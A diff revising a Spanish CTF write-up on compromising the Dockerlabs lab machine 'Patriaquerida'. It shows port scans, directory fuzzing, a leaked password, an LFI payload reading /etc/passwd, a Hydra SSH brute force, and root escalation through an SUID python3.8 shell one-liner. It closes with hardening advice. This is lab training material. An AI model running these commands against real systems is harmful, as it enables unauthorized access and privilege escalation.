@@ -1,15 +1,15 @@
 # 🛡️ Informe de Pentesting – Máquina: Patriaquerida
 
-## 🎯 Objetivo
+## 🌟 Objetivo
 
-El objetivo de esta práctica fue realizar un análisis de seguridad sobre la máquina virtual **Patriaquerida**, identificando posibles vulnerabilidades que permitan obtener acceso no autorizado y escalar privilegios hasta el usuario root.
+Realizar un análisis de seguridad completo sobre la máquina virtual **Patriaquerida**, identificando vulnerabilidades, explotándolas para obtener acceso no autorizado y escalando privilegios hasta obtener el control total del sistema (root).
 
 ---
 
 ## ⚙️ 1. Despliegue de la Máquina
 
-* Se descargó el archivo `Patriaquerida.zip` desde la plataforma Dockerlabs.
-* Se descomprimió usando el comando:
+* Se descargó el archivo `Patriaquerida.zip` desde la página de Dockerlabs.
+* Se descomprimió usando:
 
   ```bash
   unzip Patriaquerida.zip
@@ -26,11 +26,11 @@ El objetivo de esta práctica fue realizar un análisis de seguridad sobre la m�
 
 ## 🌐 2. Verificación de Conectividad
 
-* Se confirmó que la máquina estaba activa con un simple *ping*:
+Se verificó que la máquina estaba activa mediante:
 
-  ```bash
-  ping -c4 172.17.0.2
-  ```
+```bash
+ping -c4 172.17.0.2
+```
 
 ![Ping](/Patriaquerida/Imagenes/Ping.jpeg)
 
@@ -38,106 +38,114 @@ El objetivo de esta práctica fue realizar un análisis de seguridad sobre la m�
 
 ## 🔍 3. Escaneo de Puertos
 
-* Se utilizó Nmap para detectar todos los puertos abiertos:
+Se realizó un escaneo completo de puertos con Nmap:
 
-  ```bash
-  sudo nmap -p- -oopen -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts.txt
-  ```
+```bash
+sudo nmap -p- -oopen -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts.txt
+```
 
-* Resultado: puertos **22 (SSH)** y **80 (HTTP)** abiertos.
-  ![Puertos](/Patriaquerida/Imagenes/Puertos.jpeg)
+Se encontraron abiertos los puertos **22 (SSH)** y **80 (HTTP)**.
 
-* Luego, se realizó un escaneo más detallado:
+![Puertos](/Patriaquerida/Imagenes/Puertos.jpeg)
 
-  ```bash
-  extractPorts allPorts.txt
-  nmap -sC -sV -p 22,80 172.17.0.2 -oN target.txt
-  ```
+Escaneo más profundo:
+
+```bash
+extractPorts allPorts.txt
+nmap -sC -sV -p 22,80 172.17.0.2 -oN target.txt
+```
 
 ![Servicios](/Patriaquerida/Imagenes/Servicios.jpeg)
 
 ---
 
-## 🌐 4. Análisis del Sitio Web
+## 🔎 4. Análisis del Sitio Web
 
-* El sitio web era la página por defecto de Apache.
-  ![Pagina](/Patriaquerida/Imagenes/Pagina.jpeg)
+La página web mostraba el contenido por defecto del servidor Apache.
+
+![Pagina](/Patriaquerida/Imagenes/Pagina.jpeg)
 
 ---
 
-## 🪓 5. Descubrimiento de Recursos Ocultos
+## 🪓 5. Fuzzing de Directorios
 
-* Se utilizó **Gobuster** para descubrir directorios y archivos ocultos:
+Se utilizó Gobuster para encontrar recursos ocultos:
 
-  ```bash
-  gobuster dir -u http://172.17.0.2 \
+```bash
+gobuster dir -u http://172.17.0.2 \
   -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
   -t 20 -add-slash -b 403,404 -x php,html,txt
-  ```
-* Se descubrió un archivo `index.php`, que revelaba un archivo oculto: `.hidden_pass`.
-  ![Gobuster](/Patriaquerida/Imagenes/Gubuster.jpeg)
-  ![PHP](/Patriaquerida/Imagenes/php.jpeg)
+```
+
+Se encontró `index.php` y desde ahí un archivo oculto `.hidden_pass`.
+
+![Gobuster](/Patriaquerida/Imagenes/Gubuster.jpeg)
+![PHP](/Patriaquerida/Imagenes/php.jpeg)
 
 ---
 
-## 🔑 6. Obtención de Credenciales
+## 🔑 6. Obtención de Contraseña
 
-* Al acceder a `http://172.17.0.2/.hidden_pass` se encontró la contraseña: `balu`
-  ![Contraseña](/Patriaquerida/Imagenes/Contraseña.jpeg)
+Al acceder a `http://172.17.0.2/.hidden_pass`, se reveló la contraseña `balu`.
 
----
-
-## 🛠️ 7. Escaneo de Vulnerabilidades Web
-
-* Se utilizó **Nikto** para escanear el sitio:
-
-  ```bash
-  nikto -h http://172.17.0.2/index.php
-  ```
-* El escaneo reveló la posibilidad de usar *Local File Inclusion (LFI)*.
-  ![Nikto](/Patriaquerida/Imagenes/nikto.jpeg)
+![Contraseña](/Patriaquerida/Imagenes/Contraseña.jpeg)
 
 ---
 
-## 🧠 8. Explotación de LFI
+## 🛠️ 7. Escaneo con Nikto
 
-* Se explotó LFI con esta URL:
+Se ejecutó Nikto:
 
-  ```
-  http://172.17.0.2/index.php?page=../../../../etc/passwd
-  ```
-* Se accedió al archivo `/etc/passwd`, revelando usuarios del sistema:
+```bash
+nikto -h http://172.17.0.2/index.php
+```
 
-  * `pinguino`
-  * `mario`
-  * `root`
-    ![Informacion](/Patriaquerida/Imagenes/Informacion.jpeg)
+Se detectó posible vulnerabilidad de **LFI (Local File Inclusion)**.
+
+![Nikto](/Patriaquerida/Imagenes/nikto.jpeg)
 
 ---
 
-## 🔓 9. Ataque de Fuerza Bruta con Hydra
+## 🪛 8. Explotación de LFI
 
-* Se crearon dos archivos:
+Se utilizó LFI para leer el archivo `/etc/passwd`:
 
-  * `usuarios.txt` con los nombres encontrados.
-  * `contraseña.txt` con la contraseña `balu`.
-* Se ejecutó Hydra para probar credenciales vía SSH:
+```
+http://172.17.0.2/index.php?page=../../../../etc/passwd
+```
 
-  ```bash
-  hydra -L usuarios.txt -P contraseña.txt ssh://172.17.0.2 -t 50
-  ```
-* Credenciales válidas encontradas: `pinguino : balu`
-  ![Hydra](/Patriaquerida/Imagenes/Hydra.jpeg)
+Esto reveló usuarios del sistema como `pinguino`, `mario` y `root`.
+
+![Informacion](/Patriaquerida/Imagenes/Informacion.jpeg)
 
 ---
 
-## 🐧 10. Acceso al Sistema
+## 🔓 9. Fuerza Bruta con Hydra
 
-* Se accedió por SSH:
+Se crearon dos archivos:
 
-  ```bash
-  ssh pinguino@172.17.0.2
-  ```
+* `usuarios.txt` con nombres de usuario.
+* `contraseña.txt` con `balu`.
+
+Ataque con Hydra:
+
+```bash
+hydra -L usuarios.txt -P contraseña.txt ssh://172.17.0.2 -t 50
+```
+
+Se accedió exitosamente como `pinguino : balu`.
+
+![Hydra](/Patriaquerida/Imagenes/Hydra.jpeg)
+
+---
+
+## 🐧 10. Acceso SSH
+
+Ingreso a la máquina como usuario pinguino:
+
+```bash
+ssh pinguino@172.17.0.2
+```
 
 ![SSH](/Patriaquerida/Imagenes/SSH.jpeg)
 
@@ -145,43 +153,82 @@ El objetivo de esta práctica fue realizar un análisis de seguridad sobre la m�
 
 ## 🚀 11. Escalada de Privilegios
 
-### ¿Qué es escalada de privilegios?
+### 🔧 1. Búsqueda de archivos SUID
 
-Es el proceso de obtener más privilegios de los que se tienen originalmente. En este caso, se buscaba obtener permisos de **root**.
+```bash
+find / -perm -4000 2>/dev/null
+```
 
-### Técnica utilizada:
+Se encontró:
 
-1. Se buscaron binarios con el bit SUID activado:
+```
+/usr/bin/python3.8
+```
 
-   ```bash
-   find / -perm -4000 2>/dev/null
-   ```
-2. Se encontró `/usr/bin/python3.8` con SUID.
-3. Se usó este comando para ejecutar una shell como root:
+El bit SUID indica que el archivo se ejecuta con permisos del propietario (root). Verificación:
 
-   ```python
-   python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
-   ```
-4. ¡Shell de root obtenida!
-   ![Escalada](/Patriaquerida/Imagenes/Escalada.jpeg)
+```bash
+ls -l /usr/bin/python3.8
+```
+
+Salida:
+
+```
+-rwsr-xr-x 1 root root ... /usr/bin/python3.8
+```
+
+### 🎡 2. Escalada con Python
+
+Ejecutamos:
+
+```bash
+python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+```
+
+#### Explicación del código:
+
+* `import os`: importa el módulo del sistema.
+* `os.setuid(0)`: cambia el ID del usuario al UID 0 (root).
+* `os.system("/bin/bash")`: abre una shell bash.
+
+### 🚫 Riesgo
+
+Permitir que binarios como Python tengan SUID es críticamente peligroso. Un atacante puede ejecutar comandos arbitrarios como root.
+
+### ✅ Confirmación
+
+Comprobación:
+
+```bash
+whoami
+```
+
+Resultado:
+
+```
+root
+```
+
+![Escalada](/Patriaquerida/Imagenes/Escalada.jpeg)
 
 ---
 
-## ✅ Conclusiones
+## ✅ Conclusiones Finales
 
-| Etapa                       | Descripción                                                                          |
-| --------------------------- | ------------------------------------------------------------------------------------ |
-| **Descubrimiento**          | Fuzzing, LFI y escaneo de puertos revelaron información clave.                       |
-| **Credenciales**            | Se halló una contraseña en un archivo oculto y se utilizó para atacar SSH con éxito. |
-| **Acceso Inicial**          | Se ingresó como `pinguino` vía SSH.                                                  |
-| **Escalada de Privilegios** | Se explotó un binario con permisos SUID (python3.8) para obtener acceso root.        |
+| Etapa      | Descripción                                               |
+| ---------- | --------------------------------------------------------- |
+| **Fase 1** | Enumeración de puertos y servicios (Nmap)                 |
+| **Fase 2** | Descubrimiento de archivos ocultos y vulnerabilidades web |
+| **Fase 3** | Obtención de credenciales válidas (Hydra)                 |
+| **Fase 4** | Acceso remoto con SSH                                     |
+| **Fase 5** | Escalada de privilegios explotando SUID en Python         |
 
 ---
 
-## 🧩 Recomendaciones
+## 🤖 Recomendaciones
 
-* **Eliminar archivos ocultos** con información sensible (como `.hidden_pass`).
-* **Restringir el uso del bit SUID**, especialmente en binarios como Python.
-* **Filtrar entradas de usuarios** para evitar LFI.
-* **Monitorear intentos de fuerza bruta** en SSH.
-* **Usar contraseñas seguras y únicas**.
+* Eliminar archivos con información sensible como `.hidden_pass`.
+* Desactivar permisos SUID en binarios como Python.
+* Filtrar entradas del usuario para evitar LFI.
+* Monitorear intentos de acceso SSH.
+* Usar contraseñas seguras y diferentes para cada usuario.
